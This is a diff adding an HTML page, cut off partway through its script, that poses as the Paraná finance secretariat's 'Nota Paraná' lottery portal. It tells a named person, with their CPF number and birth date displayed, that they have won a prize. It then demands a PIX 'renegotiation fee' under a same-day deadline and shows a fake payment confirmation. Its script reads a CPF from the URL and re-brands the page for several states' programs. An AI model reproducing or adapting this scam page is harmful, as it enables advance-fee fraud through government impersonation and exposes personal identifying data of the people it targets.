@@ -1,0 +1,920 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Portal de Renegociação de Prêmios - Secretaria da Fazenda</title>
+  <style>
+    /* ── RESET & BASE STYLES ── */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f1f5f9;
+      color: #1e293b;
+      font-size: 13px;
+      line-height: 1.45;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── HEADER ── */
+    header {
+      background: linear-gradient(180deg, #064e28 0%, #107c41 100%);
+      color: #ffffff;
+      border-bottom: 3.5px solid #107c41;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.12);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .header-top {
+      max-width: 760px;
+      margin: 0 auto;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .brand-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .brand-logo-img {
+      height: 38px;
+      width: 38px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 1.5px solid rgba(255,255,255,0.8);
+      background: #ffffff;
+    }
+    .brand-title {
+      font-size: 15px;
+      font-weight: 700;
+    }
+    .user-badge {
+      background: rgba(255, 255, 255, 0.15);
+      padding: 4px 10px;
+      border-radius: 12px;
+      font-size: 11px;
+      color: #ffffff;
+      font-weight: 600;
+    }
+
+    /* ── CONTAINER ── */
+    .container {
+      max-width: 760px;
+      width: 100%;
+      margin: 16px auto;
+      padding: 0 16px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    /* ── WIZARD STEP INDICATOR (5 PASSOS LIMPO) ── */
+    .wizard-steps-card {
+      background: #ffffff;
+      border-radius: 12px;
+      border: 1px solid #cbd5e1;
+      padding: 16px 20px;
+      box-shadow: 0 2px 6px rgba(15, 23, 42, 0.04);
+    }
+    .steps-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: relative;
+    }
+    .steps-line-bg {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      left: 15px;
+      right: 15px;
+      height: 3px;
+      background: #e2e8f0;
+      z-index: 1;
+    }
+    .steps-line-progress {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      left: 15px;
+      width: 0%;
+      height: 3px;
+      background: #107c41;
+      z-index: 1;
+      transition: width 0.3s ease;
+    }
+    .step-node {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .step-circle {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #ffffff;
+      border: 2px solid #cbd5e1;
+      color: #64748b;
+      font-weight: 700;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s;
+    }
+    .step-node.active .step-circle {
+      border-color: #107c41;
+      background: #107c41;
+      color: #ffffff;
+      box-shadow: 0 0 0 3px rgba(16, 124, 65, 0.2);
+    }
+    .step-node.completed .step-circle {
+      border-color: #107c41;
+      background: #107c41;
+      color: #ffffff;
+    }
+
+    /* ── CARD PRINCIPAL DO WIZARD ── */
+    .wizard-card {
+      background: #ffffff;
+      border-radius: 12px;
+      border: 1px solid #cbd5e1;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+      overflow: hidden;
+    }
+    .wizard-card-header {
+      background: #f8fafc;
+      padding: 14px 20px;
+      border-bottom: 1px solid #e2e8f0;
+      font-size: 14px;
+      font-weight: 700;
+      color: #1e293b;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .wizard-card-body {
+      padding: 20px;
+    }
+
+    /* ESTILOS TABELA OFICIAL DE DEMONSTRATIVO FISCAL */
+    .gov-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 16px 0;
+      font-size: 12.5px;
+      border: 1px solid #cbd5e1;
+      border-radius: 6px;
+      overflow: hidden;
+      background: #ffffff;
+    }
+    .gov-table th {
+      background: #f1f5f9;
+      color: #1e293b;
+      font-weight: 700;
+      padding: 10px 12px;
+      text-align: left;
+      border-bottom: 2px solid #cbd5e1;
+      font-size: 11.5px;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+    .gov-table td {
+      padding: 10px 12px;
+      border-bottom: 1px solid #e2e8f0;
+      color: #334155;
+    }
+    .gov-table tr:last-child td {
+      border-bottom: none;
+    }
+    .gov-table-row-total {
+      background: #f8fafc;
+      font-weight: 700;
+    }
+    .gov-table-row-total td {
+      border-top: 2px solid #cbd5e1;
+      color: #0f172a;
+    }
+    .gov-amount-highlight {
+      font-size: 15px;
+      font-weight: 800;
+      color: #107c41;
+    }
+
+    /* ESTILOS STEP 2: SELEÇÃO DE BANCO & CHAVE PIX */
+    .bank-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+    .bank-card {
+      background: #f8fafc;
+      border: 1.5px solid #cbd5e1;
+      border-radius: 8px;
+      padding: 10px 8px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-align: center;
+    }
+    .bank-card:hover, .bank-card.selected {
+      border-color: #107c41;
+      background: #ffffff;
+      box-shadow: 0 0 0 3px rgba(16, 124, 65, 0.15);
+    }
+    .bank-logo-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      font-size: 13px;
+      color: #ffffff;
+    }
+    .bank-name {
+      font-size: 11px;
+      font-weight: 700;
+      color: #1e293b;
+    }
+
+    .form-group {
+      margin-bottom: 14px;
+    }
+    .form-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 700;
+      color: #334155;
+      margin-bottom: 6px;
+    }
+    .form-input {
+      width: 100%;
+      height: 44px;
+      padding: 0 14px;
+      font-size: 14px;
+      border: 1.5px solid #cbd5e1;
+      border-radius: 8px;
+      outline: none;
+      transition: all 0.2s;
+    }
+    .form-input:focus {
+      border-color: #107c41;
+      box-shadow: 0 0 0 3px rgba(16, 124, 65, 0.15);
+    }
+
+    .alert-titularidade {
+      background: #eff6ff;
+      border: 1px solid #bfdbfe;
+      color: #1e40af;
+      padding: 10px 12px;
+      border-radius: 8px;
+      font-size: 11.5px;
+      line-height: 1.45;
+    }
+
+    /* BOTÕES DE NAVEGAÇÃO DO WIZARD REFINADOS */
+    .wizard-actions {
+      display: flex;
+      flex-direction: column-reverse;
+      gap: 10px;
+      margin-top: 20px;
+    }
+    @media (min-width: 480px) {
+      .wizard-actions {
+        flex-direction: row;
+        align-items: center;
+      }
+    }
+    .btn-next {
+      flex: 1;
+      min-height: 48px;
+      padding: 10px 16px;
+      background: #107c41;
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: 700;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      box-shadow: 0 2px 5px rgba(16, 124, 65, 0.2);
+      transition: background-color 0.2s, transform 0.1s;
+      line-height: 1.3;
+    }
+    .btn-next:hover {
+      background: #0d6937;
+    }
+    .btn-next:active {
+      transform: scale(0.98);
+    }
+    .btn-prev {
+      min-height: 48px;
+      padding: 10px 16px;
+      background: #ffffff;
+      color: #475569;
+      border: 1px solid #cbd5e1;
+      font-size: 13.5px;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background-color 0.2s;
+    }
+    .btn-prev:hover {
+      background: #f8fafc;
+      color: #1e293b;
+    }
+
+    /* ESTILOS STEP 4: QR CODE PIX DA TAXA */
+    .pix-qr-box {
+      background: #ffffff;
+      border: 2px dashed #cbd5e1;
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+      margin: 16px 0;
+    }
+    .qr-code-img {
+      width: 180px;
+      height: 180px;
+      margin: 0 auto 14px auto;
+      display: block;
+    }
+    .pix-copia-cola-input {
+      width: 100%;
+      height: 42px;
+      padding: 0 12px;
+      font-size: 11px;
+      border: 1px solid #cbd5e1;
+      border-radius: 6px;
+      background: #f8fafc;
+      font-family: monospace;
+      margin-bottom: 8px;
+    }
+    .btn-copy-pix {
+      width: 100%;
+      height: 42px;
+      background: #174075;
+      color: #ffffff;
+      border: none;
+      border-radius: 6px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    footer {
+      background: #0b2e59;
+      color: #94a3b8;
+      text-align: center;
+      padding: 16px 12px;
+      font-size: 11px;
+      border-top: 3px solid #107c41;
+      margin-top: auto;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <div class="header-top">
+      <div class="brand-group">
+        <img id="headerLogoImg" src="/logo_nota_parana.jpg" alt="Logo Oficial" class="brand-logo-img">
+        <span class="brand-title" id="headerBrandTitle">Nota Paraná</span>
+      </div>
+      <span class="user-badge" id="headerUserBadge">Secretaria da Fazenda PR</span>
+    </div>
+  </header>
+
+  <!-- CONTEÚDO PRINCIPAL -->
+  <main class="container">
+    
+    <!-- CARD DO TITULAR LOGADO COM DADOS COMPLETOS DA BASE -->
+    <section class="wizard-steps-card" style="padding: 16px; margin-bottom: 12px;">
+      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; border-bottom: 1px solid #e2e8f0; padding-bottom: 8px;">
+        <div>
+          <div style="font-size: 15px; font-weight: 800; color: #174075;" id="resNome">GABRIEL RODRIGUES DE OLIVEIRA</div>
+          <div style="font-size: 12px; color: #64748b; font-weight: 600;" id="resCpf">CPF: 063.818.519-02</div>
+        </div>
+        <span style="font-size: 11px; background: #dcfce7; color: #166534; padding: 4px 10px; border-radius: 6px; font-weight: 700;">Sessão Autenticada</span>
+      </div>
+
+      <!-- DETALHES COMPLETOS DO CADASTRADO -->
+      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 8px; font-size: 11.5px; color: #334155; background: #f8fafc; padding: 10px 12px; border-radius: 6px; border: 1px solid #e2e8f0;">
+        <div><span style="color: #64748b; font-weight: 600;">Data Nasc.:</span> <strong id="cardDtNasc">18/09/1995</strong></div>
+        <div><span style="color: #64748b; font-weight: 600;">Nome da Mãe:</span> <strong id="cardNomeMae">-</strong></div>
+        <div><span style="color: #64748b; font-weight: 600;">Telefone:</span> <strong id="cardTelefone">-</strong></div>
+        <div><span style="color: #64748b; font-weight: 600;">Endereço:</span> <strong id="cardEndereco">ITAPEVA / SP</strong></div>
+      </div>
+    </section>
+
+    <!-- BANNER DE AVISO DE CONTEMPLAÇÃO (ABAIXO DO NOME DO USUÁRIO) -->
+    <div style="background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 8px; padding: 14px 16px; margin: 12px 0 16px 0; color: #1e40af; box-shadow: 0 1px 3px rgba(0,0,0,0.04);">
+      <div style="font-weight: 700; color: #1e3a8a; margin-bottom: 4px; font-size: 12.5px;">
+        Aviso de Contemplação no Programa de Nota Fiscal
+      </div>
+      <div style="font-size: 12px; line-height: 1.5; color: #1e40af;">
+        Identificamos que o seu CPF (<strong>063.818.519-02</strong>) foi contemplado no sorteio de prêmios por inclusão de nota fiscal em compras. Como o prazo regular de 90 dias para resgate integral expirou, seu saldo acumulado pode ser solicitado hoje com desconto de regularização.
+      </div>
+    </div>
+
+    <!-- WIZARD STEP 1: DEMONSTRATIVO DE APURAÇÃO E HOMOLOGAÇÃO -->
+    <section class="wizard-card" id="step1">
+      <div class="wizard-card-header">
+        <span>Passo 1 de 5: Resgate de Prêmio de Nota Fiscal</span>
+        <span style="color: #107c41; font-weight: 600; font-size: 11.5px; background: #dcfce7; padding: 3px 8px; border-radius: 4px;">Sorteio de Cidadania Fiscal</span>
+      </div>
+      <div class="wizard-card-body">
+        
+        <!-- TABELA OFICIAL DE DEMONSTRATIVO DE APURAÇÃO FISCAL -->
+        <table class="gov-table">
+          <thead>
+            <tr>
+              <th>Demonstrativo do Prêmio</th>
+              <th style="text-align: center;">Percentual</th>
+              <th style="text-align: right;">Valor (R$)</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Prêmio Total Sorteado (Nota Fiscal)</td>
+              <td style="text-align: center; color: #64748b;">100%</td>
+              <td style="text-align: right; font-weight: 600;">9.721,11</td>
+            </tr>
+            <tr>
+              <td>Desconto de Regularização (Fora do Prazo)</td>
+              <td style="text-align: center; color: #991b1b;">- 30%</td>
+              <td style="text-align: right; color: #991b1b; font-weight: 600;">- 2.916,33</td>
+            </tr>
+            <tr class="gov-table-row-total">
+              <td><strong>VALOR DISPONÍVEL PARA RESGATE HOJE</strong></td>
+              <td style="text-align: center; font-weight: 700; color: #107c41;">70%</td>
+              <td style="text-align: right;" class="gov-amount-highlight">R$ 6.804,78</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <div style="background: #fffbebf7; border: 1px solid #fde68a; border-left: 4px solid #d97706; border-radius: 6px; padding: 14px 16px; font-size: 12px; color: #92400e; line-height: 1.6;">
+          <strong>Regras para Liberação do Valor:</strong><br>
+          Para realizar a transferência de <strong>R$ 6.804,78</strong> para sua conta via PIX hoje, é necessário efetuar o pagamento da taxa administrativa de renegociação no valor de <strong>R$ 58,72</strong>.
+          <br><br>
+          <span style="color: #b91c1c; font-weight: 700;">Importante:</span> Caso o resgate não seja solicitado e a taxa não seja paga até o final do dia de hoje, o prêmio no valor de R$ 6.804,78 será expirado definitivamente e destinado aos cofres públicos do Estado.
+        </div>
+
+        <div class="wizard-actions">
+          <button type="button" class="btn-next" onclick="goToStep(2)">Avançar para Seleção do Banco &rarr;</button>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- WIZARD STEP 2: BANCO E CHAVE PIX DO TITULAR -->
+    <section class="wizard-card" id="step2" style="display: none;">
+      <div class="wizard-card-header">
+        <span>Passo 2 de 5: Seleção do Banco & Chave PIX</span>
+      </div>
+      <div class="wizard-card-body">
+        
+        <div class="form-group">
+          <label class="form-label" for="bankSelect">Selecione a sua Instituição Financeira:</label>
+          <select id="bankSelect" class="form-input" style="background-color: #ffffff; cursor: pointer; font-weight: 600;" onchange="onBankSelected(this.value)">
+            <option value="" disabled selected>-- Clique para selecionar seu banco --</option>
+            <option value="260 - Nu Pagamentos S.A. (Nubank)">260 - Nu Pagamentos S.A. (Nubank)</option>
+            <option value="341 - Itaú Unibanco S.A.">341 - Itaú Unibanco S.A.</option>
+            <option value="237 - Banco Bradesco S.A.">237 - Banco Bradesco S.A.</option>
+            <option value="001 - Banco do Brasil S.A.">001 - Banco do Brasil S.A.</option>
+            <option value="104 - Caixa Econômica Federal">104 - Caixa Econômica Federal</option>
+            <option value="033 - Banco Santander (Brasil) S.A.">033 - Banco Santander (Brasil) S.A.</option>
+            <option value="077 - Banco Inter S.A.">077 - Banco Inter S.A.</option>
+            <option value="336 - Banco C6 S.A. (C6 Bank)">336 - Banco C6 S.A. (C6 Bank)</option>
+            <option value="212 - Banco Original S.A.">212 - Banco Original S.A.</option>
+            <option value="290 - PagSeguro Internet S.A. (PagBank)">290 - PagSeguro Internet S.A. (PagBank)</option>
+            <option value="380 - PicPay Serviços S.A.">380 - PicPay Serviços S.A.</option>
+            <option value="655 - Banco Votorantim S.A. (BV)">655 - Banco Votorantim S.A. (BV)</option>
+            <option value="637 - Banco BTG Pactual S.A.">637 - Banco BTG Pactual S.A.</option>
+            <option value="070 - BRB - Banco de Brasília S.A.">070 - BRB - Banco de Brasília S.A.</option>
+            <option value="041 - Banco Banrisul S.A.">041 - Banco Banrisul S.A.</option>
+            <option value="047 - Banco Banese S.A.">047 - Banco Banese S.A.</option>
+            <option value="021 - Banco Banestes S.A.">021 - Banco Banestes S.A.</option>
+            <option value="037 - Banco do Estado do Pará S.A. (Banpará)">037 - Banco do Estado do Pará S.A. (Banpará)</option>
+            <option value="756 - SICOOB (Bancoob)">756 - SICOOB (Bancoob)</option>
+            <option value="748 - SICREDI S.A.">748 - SICREDI S.A.</option>
+            <option value="136 - Unicred Cooperativa">136 - Unicred Cooperativa</option>
+            <option value="422 - Banco Safra S.A.">422 - Banco Safra S.A.</option>
+            <option value="654 - Banco Digio S.A.">654 - Banco Digio S.A.</option>
+            <option value="208 - Banco BTG Pactual / Banco Pan">208 - Banco Pan S.A.</option>
+            <option value="323 - Mercado Pago IP Ltda">323 - Mercado Pago IP Ltda</option>
+            <option value="243 - Banco Máxima S.A. (Master)">243 - Banco Master S.A.</option>
+            <option value="633 - Banco Rendimento S.A.">633 - Banco Rendimento S.A.</option>
+            <option value="999 - Outro Banco / Cooperativa de Crédito">999 - Outro Banco / Cooperativa de Crédito</option>
+          </select>
+        </div>
+
+        <!-- CONTAINER DA CHAVE PIX (EXIBIDO SOMENTE APÓS SELECIONAR O BANCO) -->
+        <div id="pixInputContainer" style="display: none;">
+          <div class="form-group">
+            <label class="form-label" for="pixKeyInput">Informe a sua Chave PIX para Depósito:</label>
+            <input type="text" id="pixKeyInput" class="form-input" placeholder="CPF, E-mail, Celular ou Chave Aleatória" value="063.818.519-02">
+          </div>
+
+          <div class="alert-titularidade">
+            <strong>Regulamento Obrigatório de Titularidade:</strong><br>
+            A chave PIX deve pertencer obrigatoriamente à mesma titularidade do CPF autenticado (<strong>GABRIEL RODRIGUES DE OLIVEIRA</strong>). Depósitos em contas de terceiros serão rejeitados automaticamente pelo sistema financeiro.
+          </div>
+        </div>
+
+        <div class="wizard-actions">
+          <button type="button" class="btn-prev" onclick="goToStep(1)">&larr; Voltar</button>
+          <button type="button" class="btn-next" id="btnNextStep2" style="opacity: 0.6; pointer-events: none;" onclick="goToStep(3)">Conferir Resumo &rarr;</button>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- WIZARD STEP 3: RESUMO GERAL -->
+    <section class="wizard-card" id="step3" style="display: none;">
+      <div class="wizard-card-header">
+        <span>Passo 3 de 5: Resumo da Solicitação de Resgate</span>
+      </div>
+      <div class="wizard-card-body">
+        
+        <!-- TABELA FORMAL DE CONFERÊNCIA DE DADOS (STEP 3) -->
+        <table class="gov-table" style="margin-top: 0;">
+          <thead>
+            <tr>
+              <th colspan="2">Conferência dos Dados de Resgate</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td style="width: 40%; color: #64748b; font-weight: 600;">Titular do Prêmio:</td>
+              <td style="font-weight: 700; color: #0f172a;" id="sumNome">GABRIEL RODRIGUES DE OLIVEIRA</td>
+            </tr>
+            <tr>
+              <td style="color: #64748b; font-weight: 600;">CPF do Titular:</td>
+              <td style="font-weight: 700; color: #0f172a;" id="sumCpf">063.818.519-02</td>
+            </tr>
+            <tr>
+              <td style="color: #64748b; font-weight: 600;">Data de Nascimento:</td>
+              <td style="font-weight: 700; color: #0f172a;" id="sumDtNasc">18/09/1995</td>
+            </tr>
+            <tr>
+              <td style="color: #64748b; font-weight: 600;">Nome da Mãe:</td>
+              <td style="font-weight: 700; color: #0f172a;" id="sumNomeMae">-</td>
+            </tr>
+            <tr>
+              <td style="color: #64748b; font-weight: 600;">Município / UF:</td>
+              <td style="font-weight: 700; color: #0f172a;" id="sumCidadeUf">ITAPEVA / SP</td>
+            </tr>
+            <tr>
+              <td style="color: #64748b; font-weight: 600;">Instituição Financeira:</td>
+              <td style="font-weight: 700; color: #0f172a;" id="sumBanco">Nubank</td>
+            </tr>
+            <tr>
+              <td style="color: #64748b; font-weight: 600;">Chave PIX Cadastrada:</td>
+              <td style="font-weight: 700; color: #0f172a;" id="sumPixKey">063.818.519-02</td>
+            </tr>
+            <tr>
+              <td style="color: #166534; font-weight: 700;">Valor Líquido do Resgate (70%):</td>
+              <td style="font-weight: 800; color: #107c41; font-size: 15px;">R$ 6.804,78</td>
+            </tr>
+            <tr class="gov-table-row-total">
+              <td style="color: #92400e; font-weight: 700;">Taxa da Guia de Renegociação:</td>
+              <td style="font-weight: 800; color: #92400e; font-size: 15px;">R$ 58,72</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <div style="background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 6px; padding: 12px 14px; margin-bottom: 16px; font-size: 12px; color: #1e40af; line-height: 1.55;">
+          <strong>Prazo de Depósito:</strong> Após a confirmação da taxa de R$ 58,72, o montante líquido de R$ 6.804,78 será depositado na chave PIX informada no prazo de <strong>até 3 dias úteis</strong>.
+        </div>
+
+        <div class="wizard-actions">
+          <button type="button" class="btn-prev" onclick="goToStep(2)">&larr; Alterar Dados</button>
+          <button type="button" class="btn-next" onclick="goToStep(4)">Pagamento da Guia de Renegociação &rarr;</button>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- WIZARD STEP 4: GERAR PAGAMENTO PIX DA TAXA -->
+    <section class="wizard-card" id="step4" style="display: none;">
+      <div class="wizard-card-header">
+        <span>Passo 4 de 5: Pagamento da Taxa de Renegociação</span>
+      </div>
+      <div class="wizard-card-body">
+        
+        <div style="text-align: center; margin-bottom: 12px;">
+          <div style="font-size: 14px; font-weight: 700; color: #0f172a;">Taxa de Regularização Fiscal</div>
+          <div style="font-size: 26px; font-weight: 800; color: #107c41; margin: 4px 0;">R$ 58,72</div>
+          <div style="font-size: 11.5px; color: #64748b;">Escaneie o QR Code abaixo com o app do seu banco ou use a chave Copia e Cola</div>
+        </div>
+
+        <div class="pix-qr-box">
+          <!-- QR CODE PIX PLACEHOLDER DEMONSTRAÇÃO -->
+          <img class="qr-code-img" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540558.725802BR5925SECTAZ%20RENEGOCIACAO6009CURITIBA62070503***63041D2C" alt="QR Code PIX">
+          
+          <label class="form-label" style="text-align: left;">PIX Copia e Cola:</label>
+          <input type="text" id="pixCopiaCola" class="pix-copia-cola-input" readonly value="00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540558.725802BR5925SECTAZ%20RENEGOCIACAO6009CURITIBA62070503***63041D2C">
+          
+          <button type="button" class="btn-copy-pix" onclick="copyPixCode()">Copiar Código PIX</button>
+        </div>
+
+        <div style="text-align: center; color: #64748b; font-size: 11.5px;">
+          Aguardando confirmação do pagamento em tempo real pelo Banco Central...
+        </div>
+
+      </div>
+    </section>
+
+    <!-- WIZARD STEP 5: CONCLUSÃO & CONFIRMAÇÃO DO DEPOSITO -->
+    <section class="wizard-card" id="step5" style="display: none;">
+      <div class="wizard-card-header" style="background: #f0fdf4; border-bottom-color: #bbf7d0;">
+        <span style="color: #166534;">Passo 5 de 5: Resgate Concluído!</span>
+      </div>
+      <div class="wizard-card-body" style="text-align: center;">
+        
+        <div style="width: 64px; height: 64px; background: #107c41; color: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; margin: 0 auto 16px auto;">
+          ✓
+        </div>
+
+        <div style="font-size: 18px; font-weight: 800; color: #166534; margin-bottom: 6px;">Pagamento Confirmado!</div>
+        <div style="font-size: 13px; color: #334155; margin-bottom: 20px;">
+          A taxa de R$ 58,72 foi compensada com sucesso. A transferência do valor líquido de <strong>R$ 6.804,78</strong> foi agendada para a sua chave PIX.
+        </div>
+
+        <div class="summary-alert-box" style="text-align: left; background: #f8fafc;">
+          <div class="calc-row">
+            <span class="calc-label">Comprovante de Operação:</span>
+            <span class="calc-value">#9874125-SEC</span>
+          </div>
+          <div class="calc-row">
+            <span class="calc-label">Valor Transferido:</span>
+            <span class="calc-value" style="color: #107c41;">R$ 6.804,78</span>
+          </div>
+          <div class="calc-row">
+            <span class="calc-label">Prazo de Envio:</span>
+            <span class="calc-value">Até 15 minutos</span>
+          </div>
+        </div>
+
+        <a href="/portal_nfe.html" class="btn-next" style="text-decoration: none; display: flex; align-items: center; justify-content: center;">Finalizar e Voltar ao Início</a>
+
+      </div>
+    </section>
+
+    <!-- INDICADOR DE ETAPAS DO WIZARD (POSICIONADO NA PARTE INFERIOR) -->
+    <section class="wizard-steps-card" style="padding: 14px 20px; margin-top: 16px;">
+      <div class="steps-container">
+        <div class="steps-line-bg"></div>
+        <div class="steps-line-progress" id="stepsProgressLine"></div>
+
+        <div class="step-node active" id="node1">
+          <div class="step-circle">1</div>
+        </div>
+        <div class="step-node" id="node2">
+          <div class="step-circle">2</div>
+        </div>
+        <div class="step-node" id="node3">
+          <div class="step-circle">3</div>
+        </div>
+        <div class="step-node" id="node4">
+          <div class="step-circle">4</div>
+        </div>
+        <div class="step-node" id="node5">
+          <div class="step-circle">5</div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- FOOTER INSTITUCIONAL COMPLETO E CONGRUENTE -->
+  <footer style="background: #0b2e59; color: #cbd5e1; padding: 32px 16px 20px 16px; border-top: 4px solid #107c41; font-size: 11.5px; line-height: 1.6; margin-top: auto;">
+    <div style="max-width: 760px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 24px; margin-bottom: 24px; text-align: left;">
+      
+      <!-- COLUNA 1: INSTITUCIONAL -->
+      <div>
+        <div style="font-weight: 700; color: #ffffff; font-size: 13px; margin-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.15); padding-bottom: 4px;">
+          Programa de Cidadania Fiscal
+        </div>
+        <p style="color: #94a3b8; margin-bottom: 8px;">
+          Sistema oficial de regularização e homologação fiscalizatória de bilhetes e prêmios de notas fiscais estaduais.
+        </p>
+        <div style="color: #64748b; font-size: 10.5px;">
+          Secretaria de Estado da Fazenda &bull; SEFAZ
+        </div>
+      </div>
+
+      <!-- COLUNA 2: LEGISLAÇÃO E TRANSPARÊNCIA -->
+      <div>
+        <div style="font-weight: 700; color: #ffffff; font-size: 13px; margin-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.15); padding-bottom: 4px;">
+          Legislação & Regulamentação
+        </div>
+        <ul style="list-style: none; padding: 0; color: #94a3b8; display: flex; flex-direction: column; gap: 4px;">
+          <li>Lei Estadual de Estímulo à Cidadania Fiscal</li>
+          <li>Decreto de Regulação de Sorteios e Prêmios</li>
+          <li>Portaria de Homologação de Resgates PIX</li>
+          <li>Portal da Transparência Financeira</li>
+        </ul>
+      </div>
+
+      <!-- COLUNA 3: ATENDIMENTO E OUVIDORIA -->
+      <div>
+        <div style="font-weight: 700; color: #ffffff; font-size: 13px; margin-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.15); padding-bottom: 4px;">
+          Atendimento & Ouvidoria
+        </div>
+        <p style="color: #94a3b8;">
+          Central Eletrônica do Contribuinte:<br>
+          <span style="color: #ffffff; font-weight: 600;">Atendimento Digital 24 horas</span>
+        </p>
+        <p style="color: #94a3b8; margin-top: 6px;">
+          Canal de Denúncias e Ouvidoria Geral do Estado
+        </p>
+      </div>
+
+    </div>
+
+    <!-- BARRA INFERIOR DE DIREITOS E LGPD -->
+    <div style="max-width: 760px; margin: 0 auto; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 16px; text-align: center; color: #64748b; font-size: 10.5px;">
+      <div>
+        &copy; 2026 Sistema de Renegociação e Liberação de Prêmios &bull; Todos os direitos reservados.
+      </div>
+      <div style="margin-top: 4px; color: #475569;">
+        Conformidade com a Lei Geral de Proteção de Dados (LGPD - Lei nº 13.709/2018) &bull; Protocolo de Segurança SSL/TLS 256-bits.
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const cpfParam = params.get('cpf') || '06381851902';
+
+    let selectedBankName = '';
+
+    function onBankSelected(val) {
+      if (!val) return;
+      selectedBankName = val;
+      
+      const container = document.getElementById('pixInputContainer');
+      const btnNext = document.getElementById('btnNextStep2');
+      
+      if (container) container.style.display = 'block';
+      if (btnNext) {
+        btnNext.style.opacity = '1';
+        btnNext.style.pointerEvents = 'auto';
+      }
+    }
+
+    // BANCOS E MAPEAMENTO ESTADUAL
+    const PROGRAMAS_ESTADUAIS = {
+      'PR': { nome: 'Nota Paraná', cor: '#107c41', bgHeader: 'linear-gradient(180deg, #064e28 0%, #107c41 100%)', logo: '/logo_nota_parana.jpg' },
+      'SP': { nome: 'Nota Fiscal Paulista', cor: '#b91c1c', bgHeader: 'linear-gradient(180deg, #7f1d1d 0%, #b91c1c 100%)', logo: '/logo_nota_paulista.jpg' },
+      'RJ': { nome: 'Nota Carioca', cor: '#1d4ed8', bgHeader: 'linear-gradient(180deg, #1e3a8a 0%, #1d4ed8 100%)', logo: '/logo_nota_parana.jpg' },
+      'RS': { nome: 'Nota Fiscal Gaúcha', cor: '#047857', bgHeader: 'linear-gradient(180deg, #064e3b 0%, #047857 100%)', logo: '/logo_nota_parana.jpg' }
+    };
+
+    function updateStateProgram(stateCode) {
+      const uf = (stateCode || 'PR').toUpperCase();
+      const prog = PROGRAMAS_ESTADUAIS[uf] || { nome: `Nota Fiscal (${uf})`, cor: '#107c41', bgHeader: 'linear-gradient(180deg, #0b2e59 0%, #174075 100%)', logo: '/logo_nota_parana.jpg' };
+      
+      const headerElem = document.querySelector('header');
+      const headerLogoImg = document.getElementById('headerLogoImg');
+      const headerBrandTitle = document.getElementById('headerBrandTitle');
+      const headerUserBadge = document.getElementById('headerUserBadge');
+
+      if (headerElem) headerElem.style.background = prog.bgHeader;
+      if (headerLogoImg) headerLogoImg.src = prog.logo;
+      if (headerBrandTitle) headerBrandTitle.innerText = prog.nome;
